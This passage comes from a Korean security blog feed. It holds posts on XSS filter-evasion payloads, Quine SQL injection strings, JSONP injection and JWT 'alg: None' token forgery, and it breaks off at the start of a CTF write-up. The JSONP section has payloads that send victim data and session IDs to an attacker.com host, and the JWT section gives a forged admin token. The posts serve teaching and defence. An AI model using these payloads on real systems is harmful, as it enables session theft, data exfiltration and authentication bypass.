chrome</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> <span class="attr">name</span>=<span class="string">xss</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line">http://rwx.kr/endpoint?...#xss</span><br></pre></td></tr></table></figure><h2 id="document-createComment"><a href="#document-createComment" class="headerlink" title="document.createComment"></a>document.createComment</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">input : <span class="built_in">document</span>[<span class="string">'createComment'</span>](<span class="string">'--&gt;&lt;img src onerror=alert(1)&gt;&lt;!--'</span>)</span><br><span class="line">        또는 <span class="built_in">document</span>.createComment<span class="string">`--&gt;&lt;img src onerror=alert(1)&gt;&lt;!--`</span></span><br><span class="line">output : &lt;!----&gt;<span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span><span class="comment">&lt;!----&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="php-checkdnsrr"><a href="#php-checkdnsrr" class="headerlink" title="php::checkdnsrr()"></a>php::checkdnsrr()</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Use wildcard domain</span><br><span class="line">http:&#x2F;&#x2F;&#39;onmouseover&#x3D;&#39;alert(1)&#39;.fuf.me</span><br></pre></td></tr></table></figure><h2 id="Loop-in-a-line"><a href="#Loop-in-a-line" class="headerlink" title="Loop in a line"></a>Loop in a line</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>[x=&#123;<span class="attr">toString</span>:<span class="function"><span class="params">x</span>=&gt;</span>alert(<span class="number">1</span>)|x&#125;]</span><br></pre></td></tr></table></figure><h2 id="Call-by-context"><a href="#Call-by-context" class="headerlink" title="Call by context"></a>Call by context</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.__defineGetter__(<span class="string">"arg"</span>,x=&gt;alert(<span class="number">1</span>)|<span class="number">1234</span>);</span><br><span class="line">  or arg = &#123;<span class="attr">toString</span>:<span class="function"><span class="params">x</span>=&gt;</span>alert(<span class="number">1</span>)|<span class="number">1234</span>&#125;</span><br><span class="line"><span class="keyword">if</span> (arg == <span class="number">1234</span>) &#123;</span><br><span class="line">    <span class="comment">// do something</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Whitespace-on-js"><a href="#Whitespace-on-js" class="headerlink" title="Whitespace on js"></a>Whitespace on js</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">9 - 13, 32, 160, 5760, 8192 - 8202, 8232, 8233, 8239, 8287, 12288, 65279</span><br></pre></td></tr></table></figure><h2 id="Elements-supporting-named-reference"><a href="#Elements-supporting-named-reference" class="headerlink" title="Elements supporting named reference"></a>Elements supporting named reference</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// form, img, embed, frameset, iframe, object</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">name</span>=<span class="string">"foo"</span> <span class="attr">alt</span>=<span class="string">"str"</span>&gt;</span></span><br><span class="line">// window.foo, document.foo, foo</span><br><span class="line">// foo.alt == "str" : true</span><br></pre></td></tr></table></figure><h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><ul><li>[<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS+Injection]" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS+Injection]</a>(<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS</a> Injection)</li><li><a href="https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml" target="_blank" rel="noopener">https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml</a></li><li><a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet" target="_blank" rel="noopener">https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</a></li><li><a href="https://github.com/masazumi-github/alert-1-to-win#a004" target="_blank" rel="noopener">https://github.com/masazumi-github/alert-1-to-win</a></li><li><a href="https://turkmenog.lu/blog/2017/11/06/yet-another-chrome-xss-auditor-bypass/" target="_blank" rel="noopener">https://turkmenog.lu/blog/2017/11/06/yet-another-chrome-xss-auditor-bypass/</a></li><li><a href="https://github.com/cure53/browser-sec-whitepaper/raw/master/browser-security-whitepaper.pdf" target="_blank" rel="noopener">https://github.com/cure53/browser-sec-whitepaper/raw/master/browser-security-whitepaper.pdf</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
            <tag> CheatSheet </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Quine SQL Injection</title>
      <link href="/quine-sql-injection/"/>
      <url>/quine-sql-injection/</url>
      
        <content type="html"><![CDATA[<h2 id="Quine-SQL-이란"><a href="#Quine-SQL-이란" class="headerlink" title="Quine SQL 이란"></a>Quine SQL 이란</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">'s = %r\nprint(s%%s)'</span></span><br><span class="line">print(s%s)</span><br></pre></td></tr></table></figure><p>Quine 은 소스코드를 그대로 출력으로 반환하는 프로그램을 의미하는데<br>위의 파이썬 소스코드를 참고하면 어떤 의미인지 쉽게 이해할 수 있을 것이다.<br>이는 대부분의 언어로 작성되어 <a href="https://en.wikipedia.org/wiki/Quine_(computing)" target="_blank" rel="noopener">위키백과</a>에 등재되어 있다.</p><h2 id="Quine-SQL-Query"><a href="#Quine-SQL-Query" class="headerlink" title="Quine SQL Query"></a>Quine SQL Query</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">REPLACE</span>(<span class="keyword">REPLACE</span>(<span class="string">'SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine'</span>,<span class="built_in">CHAR</span>(<span class="number">34</span>),<span class="built_in">CHAR</span>(<span class="number">39</span>)),<span class="built_in">CHAR</span>(<span class="number">36</span>),<span class="string">'SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine'</span>) <span class="keyword">AS</span> Quine;</span><br></pre></td></tr></table></figure><p>마찬가지로 SQL 언어를 사용해 작성한 Quine 쿼리도 존재하는데, 위가 그 예이다.</p><p><img src="/img/2019/05/image.png" alt="img"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">replace</span>(<span class="keyword">replace</span>(<span class="string">'select replace(replace("$",char(34),char(39)),char(36),"$")'</span>,<span class="built_in">char</span>(<span class="number">34</span>),<span class="built_in">char</span>(<span class="number">39</span>)),<span class="built_in">char</span>(<span class="number">36</span>),<span class="string">'select replace(replace("$",char(34),char(39)),char(36),"$")'</span>);</span><br></pre></td></tr></table></figure><p>여기서 필요없는 부분을 잘라내면 위와 같다.</p><p>이런 특성을 이용하여 SQL 인젝션에 응용할 수 있는데<br>사용자 입력과 쿼리 결과값이 같은지 확인하는 검증로직이 존재할 경우에<br>이를 사용하면 우회가 가능할 것이다.</p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 싱글쿼트가 필요한 경우</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">replace</span>(<span class="keyword">replace</span>(<span class="string">'[prefix] select replace(replace("$",char(34),char(39)),char(36),"$") [postfix]'</span>,<span class="built_in">char</span>(<span class="number">34</span>),<span class="built_in">char</span>(<span class="number">39</span>)),<span class="built_in">char</span>(<span class="number">36</span>),<span class="string">'[prefix] select replace(replace("$",char(34),char(39)),char(36),"$") [postfix]'</span>) [postfix];</span><br><span class="line"></span><br><span class="line"><span class="comment"># 더블쿼트가 필요한 경우</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">replace</span>(<span class="keyword">replace</span>(<span class="string">"[prefix] select replace(replace('$',char(39),char(34)),char(36),'$') [postfix]"</span>,<span class="built_in">char</span>(<span class="number">39</span>),<span class="built_in">char</span>(<span class="number">34</span>)),<span class="built_in">char</span>(<span class="number">36</span>),<span class="string">"[prefix] select replace(replace('$',char(39),char(34)),char(36),'$') [postfix]"</span>) [postfix];</span><br></pre></td></tr></table></figure><p>위 식에서 필요에 따라 [prefix]와 [postfix] 부분에 자유롭게 부가문장을 삽입할 수 있다.<br>다만 replace 함수에 의해 더블쿼트가 싱글쿼트로 변환된다는 것에 주의하자.<br>만약 더블쿼트 인젝션이 필요하다면 반전된 식을 사용하면 될 것이다.</p><h2 id="Examples"><a href="#Examples" class="headerlink" title="Examples"></a>Examples</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">prefix : a' union / postfix : <span class="comment">-- -</span></span><br><span class="line">a' union <span class="keyword">select</span> <span class="keyword">replace</span>(<span class="keyword">replace</span>(<span class="string">'a" union select replace(replace("$",char(34),char(39)),char(36),"$") as quine-- -'</span>,<span class="built_in">char</span>(<span class="number">34</span>),<span class="built_in">char</span>(<span class="number">39</span>)),<span class="built_in">char</span>(<span class="number">36</span>),<span class="string">'a" union select replace(replace("$",char(34),char(39)),char(36),"$") as quine-- -'</span>) <span class="keyword">as</span> quine;</span><br><span class="line"></span><br><span class="line">prefix : 0 union / postfix : <span class="comment">#</span></span><br><span class="line">0 union <span class="keyword">select</span> <span class="keyword">replace</span>(<span class="keyword">replace</span>(<span class="string">'0 union select replace(replace("$",char(34),char(39)),char(36),"$") as quine#'</span>,<span class="built_in">char</span>(<span class="number">34</span>),<span class="built_in">char</span>(<span class="number">39</span>)),<span class="built_in">char</span>(<span class="number">36</span>),<span class="string">'0 union select replace(replace("$",char(34),char(39)),char(36),"$") as quine#'</span>) <span class="keyword">as</span> quine<span class="comment">#;</span></span><br><span class="line"></span><br><span class="line">prefix : a<span class="string">" union / postfix : #</span></span><br><span class="line"><span class="string">a"</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">replace</span>(<span class="keyword">replace</span>(<span class="string">"a' union select replace(replace('$',char(39),char(34)),char(36),'$') #"</span>,<span class="built_in">char</span>(<span class="number">39</span>),<span class="built_in">char</span>(<span class="number">34</span>)),<span class="built_in">char</span>(<span class="number">36</span>),<span class="string">"a' union select replace(replace('$',char(39),char(34)),char(36),'$') #"</span>) <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">prefix : a<span class="string">" union / postfix : -- -</span></span><br><span class="line"><span class="string">a"</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">replace</span>(<span class="keyword">replace</span>(<span class="string">"a' union select replace(replace('$',char(39),char(34)),char(36),'$') -- -"</span>,<span class="built_in">char</span>(<span class="number">39</span>),<span class="built_in">char</span>(<span class="number">34</span>)),<span class="built_in">char</span>(<span class="number">36</span>),<span class="string">"a' union select replace(replace('$',char(39),char(34)),char(36),'$') -- -"</span>) <span class="comment">-- -</span></span><br></pre></td></tr></table></figure><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="http://secuinside.com/archive/2017/2017-1-2.pdf" target="_blank" rel="noopener">http://secuinside.com/archive/2017/2017-1-2.pdf</a></li><li><a href="https://cc0ma.github.io/los-ouroboros/" target="_blank" rel="noopener">https://cc0ma.github.io/los-ouroboros/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Quine SQL Injection </tag>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jsonp Injection Attack</title>
      <link href="/jsonp-injection-attack/"/>
      <url>/jsonp-injection-attack/</url>
      
        <content type="html"><![CDATA[<h2 id="CORS-Cross-Origin-Resource"><a href="#CORS-Cross-Origin-Resource" class="headerlink" title="CORS(Cross Origin Resource)"></a>CORS(Cross Origin Resource)</h2><p>HTTP 통신시에, 처음 전송되는 리소스와 다른 도메인으로부터 리소스가 요청될 경우 해당 요청을 Cross-origin HTTP Request 라고 부른다.<br>보안 상의 이유로 대부분의 브라우저들은 이러한 통신을 제한하고 있는데<br>자바스크립트의 XMLHttpRequest 객체로 통신할 때에 사이트 외의 도메인에 요청을 보낼 수 없는 것 또한 이런 이유에서다.<br>CORS는 Jsonp, document.cookie 값 설정, 브라우저 특수 옵션(크롬의 –disable-web-security 옵션 등) 와 같은 방법으로<br>일부 극복이 가능하지만 보안 취약점을 유발할 수 있기에 주의하여 사용하여야 한다.</p><h2 id="JSONP-JSON-with-Padding"><a href="#JSONP-JSON-with-Padding" class="headerlink" title="JSONP(JSON with Padding)"></a>JSONP(JSON with Padding)</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">parseResponse</span><span class="params">(data)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript"><span class="comment">// do something with data</span></span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://example.com/info/?callback=parseResponse"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Jsonp는 일반적으로 위와 같은 형식으로 구성되는데<br><code>&lt;script&gt;</code>는 cors의 제한을 받지 않기에 src 속성에 주소를 지정해주면<br>다른 도메인이라도 주소의 데이터를 가져와 스크립트로서 실행시킨다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// http://example.com/info/?callback=parseResponse</span></span><br><span class="line">parseResponse(&#123;<span class="string">"name"</span> : <span class="string">"James"</span>&#125;)</span><br></pre></td></tr></table></figure><p>서버의 응답은 Json 형태의 변수를 callback 함수가 소괄호로 감싸는 형태로 이루어지는데<br>내부의 변수를 인자로 하여 콜백 함수를 실행시키도록 구성된다.</p><h2 id="JSONP-Injection"><a href="#JSONP-Injection" class="headerlink" title="JSONP Injection"></a>JSONP Injection</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// data</span><br><span class="line">parseResponse(&#123;"name" : "James"&#125;)</span><br><span class="line"></span><br><span class="line">// payload</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">parseResponse</span><span class="params">(data)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">(<span class="keyword">new</span> Image).src = <span class="string">"https://attacker.com/?q="</span> + <span class="built_in">JSON</span>.stringify(data);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://example.com/info/?callback=parseResponse"</span>&gt;</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>가장 대표적인 예로 콜백 함수에 의해 함수가 실행되는 경우로<br>스크립트가 삽입된 곳으로 클라이언트가 접속만 한다면 전혀 관계가 없는 사이트로 데이터를 요청할 수 있다.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// data</span><br><span class="line">session_id='5bbfe9d379e8319f29b1582be8e1f342'</span><br><span class="line"></span><br><span class="line">// payload</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://example.com/info/"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">(<span class="keyword">new</span> Image).src = <span class="string">"https://attacker.com/?q="</span> + session_id;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>응답이 자바스크립트의 변수의 정의문으로 기능할 경우이다.<br>실제 스크립트로서 동작하고 변수의 이름을 예측할 수 있다면 데이터 탈취가 가능하다.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// data</span><br><span class="line">admin_5bbfe9d379e8319f29b1582be8e1f342= 1</span><br><span class="line"></span><br><span class="line">// payload</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://example.com/info.html"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">(<span class="keyword">new</span> Image).src = <span class="string">"https://attacker.com/?q="</span> +</span></span><br><span class="line"><span class="javascript"><span class="built_in">Object</span>.getOwnPropertyNames(<span class="built_in">window</span>).filter(<span class="function"><span class="params">x</span>=&gt;</span>x.indexOf(<span class="string">'admin'</span>)!=<span class="number">-1</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>l-value가 base64로 되어있고 r-value가 변수로 파싱 가능할 경우이다.<br>Object.getOwnPropertyNames 함수를 이용해 정의된 모든 변수 이름을 가져올 수 있고<br>변수 이름을 예측 가능하다면 filter 함수를 이용해 대상을 특정하여 추출할 수 있다.<br>이외에도 동일한 기능을 하는 함수로 Object.keys 를 사용할 수 있다.</p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>GET 메소드를 통한 요청밖에 불가능하다는 점은 JSONP Injection의 한계점이다.<br>Jsonp는 script 태그의 리소스를 지정하여 데이터를 불러오는 방법이므로<br>GET 이외의 메소드로 Jsonp를 구현할 방법은 현재로서 없다.</p><p>Jsonp Injection을 예방하는 최고의 방법은 애초부터 Jsonp를 사용하지 않는 것이다.<br>별도의 서버 설정을 필요로 하지만 cross-domain ajax를 사용하면 완벽하게 대체 가능하다.<br>또한 Access-Control-Allow-Origin 헤더를 이용하여 접근을 제한시켜 주거나<br>페이지의 mime type을 설정하여 script 태그의 리소스로서 사용하지 못하도록 하면 된다.</p>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CORS </tag>
            
            <tag> JSONP </tag>
            
            <tag> Jsonp Injection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JWT None Type Injection Attack</title>
      <link href="/jwt-none-type-injection-attack/"/>
      <url>/jwt-none-type-injection-attack/</url>
      
        <content type="html"><![CDATA[<blockquote><p>JSON Web Token(RFC 7519)은 JSON 문서에 <a href="https://auth0.com/docs/tokens/jwt-claims" target="_blank" rel="noopener">클레임</a>을 인코딩한 후 서명하는 방법이다.</p></blockquote><h2 id="JWT란"><a href="#JWT란" class="headerlink" title="JWT란"></a>JWT란</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; base64 encoded (generally included in cookie)</span><br><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwZXJtcyI6Imd1ZXN0IiwiaWF0IjoxNTU2MjU3NTg0fQ.tlc7WJ1t5gHsztrjAkRbxzZklwGEvfqXupFPuav1TXM</span><br></pre></td></tr></table></figure><p>JWT 는 웹사이트 사용자 인증에서 종종 쓰이는데, 쿠키에 주로 포함되어 쓰인다.<br>base64로 인코딩되어 온점 2개로 구분되는 header.payload.signature 의 구조를 띈다.</p><blockquote><p><a href="https://jwt.io/" target="_blank" rel="noopener">https://jwt.io/</a> 에서 JWT를 간편하게 복호화해 볼 수 있다.</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// First Part (Header)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"alg"</span>: <span class="string">"HS256"</span>,     <span class="comment">// Encrypted by 'HMAC SHA256'</span></span><br><span class="line">  <span class="string">"typ"</span>: <span class="string">"JWT"</span>        <span class="comment">// Json Web Token</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Header는 Type와 Algorithm 두 요소를 가지며, alg는 JWT의 세번째 부분인 Signature의 해싱 알고리즘을 지정할 수 있다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Second Part (Payload)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"perms"</span>: <span class="string">"guest"</span>,</span><br><span class="line">  <span class="string">"iat"</span>: <span class="number">1556257584</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Payload는 토큰의 실제 정보가 들어있다.<br>인증에 쓰이는 정보 이외에 추가로 클레임(<a href="http://https://auth0.com/docs/tokens/jwt-claims#reserved-claims" target="_blank" rel="noopener">reserved claim</a>) 이라고 부르는 정보가 포함되는데<br>토큰의 상태정보를 보관하는 용도로 설정에 따라 포함된다.</p><h2 id="None-Type-attack"><a href="#None-Type-attack" class="headerlink" title="None Type attack"></a>None Type attack</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Header and Payload</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"alg"</span>: <span class="string">"None"</span>,</span><br><span class="line">  <span class="string">"typ"</span>: <span class="string">"JWT"</span></span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"perms"</span>: <span class="string">"admin"</span>,</span><br><span class="line">  <span class="string">"iat"</span>: <span class="number">1556257584</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Base64 encoded and replaced</span></span><br><span class="line">eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJwZXJtcyI6ImFkbWluIiwiaWF0IjoxNTU2MjU3NTg0fQ.</span><br></pre></td></tr></table></figure><p>None Type Injection은 Header의 Alogorithm 타입을 None으로 변조하었을 경우 발생할 수 있는 취약점이다.<br>이로 인해 Signature 부분 검증이 생략되므로 인증을 우회할 수 있는 것인데<br>공격자 입장에서 정보를 수정한 후 Base64로 인코딩하고<br><code>=</code> 소거 후 <code>+</code>와 <code>/</code> 을 각각 <code>-</code>와 <code>_</code> 으로 변경하여 주면 된다.</p><p>안전한 JWT 인증을 위해서는 반드시 알고리즘 타입을 검증하고 예측할 수 없는 난수키를 사용하여야 하겠다.</p>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JWT </tag>
            
            <tag> JWT None Type Injection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AngstromCTF - Madlibbin</title>
      <link href="/angstromctf-madlibbin/"/>
      <url>/angstromctf-madlibbin/</url>
      
        <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> redirect, render_template</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> abort</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = os.environ.get(<span class="string">'FLAG'</span>)</span><br><span class="line"></span><br><span class="line">redis = redis.Redis(host=<span class="string">'madlibbin_redis'</span>, port=<span class="number">6379</span>, db=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">generate = <span class="keyword">lambda</span>: binascii.hexlify(os.urandom(<span class="number">16</span>)).decode()</span><br><span class="line">parse = <span class="keyword">lambda</span> x: list(dict.fromkeys(re.findall(<span class="string">r'(?&lt;=\&#123;args\[)[\w\-\s]+(?=\]\&#125;)'</span>, x)))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">()</span>:</span></span><br><span class="line">tag = generate()</span><br><span class="line">template = request.form.get(<span class="string">'template'</span>, <span class="string">''</span>)</span><br><span class="line">madlib = &#123;</span><br><span class="line"><span class="string">'template'</span>: template,</span><br><span class="line"><span class="string">'blanks'</span>: parse(template)</span><br><span class="line">&#125;</span><br><span class="line">redis.set(tag, json.dumps(madlib))</span><br><span class="line"><span class="keyword">return</span> redirect(<span class="string">'/&#123;&#125;'</span>.format(tag))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/&lt;tag&gt;', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">(tag)</span>:</span></span><br><span class="line"><span class="keyword">if</span> redis.exists(tag):</span><br><span class="line">madlib = json.loads(redis.get(tag))</span><br><span class="line"><span class="keyword">if</span> set(request.args.keys()) == set(madlib[<span class="string">'blanks'</span>]):</span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">'result.html'</span>, stuff=madlib[<span class="string">'template'</span>].format(args=request.args))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">'fill.html'</span>, blanks=madlib[<span class="string">'blanks'</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">abort(<span class="number">404</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">app.run()</span><br></pre></td></tr></table></figure><p>python format string injection 문제이다. 강조된 문장에서 볼 수 있듯 args 변수에 request.args 를 대입하여 format 메소드의 인자로 이용하는데 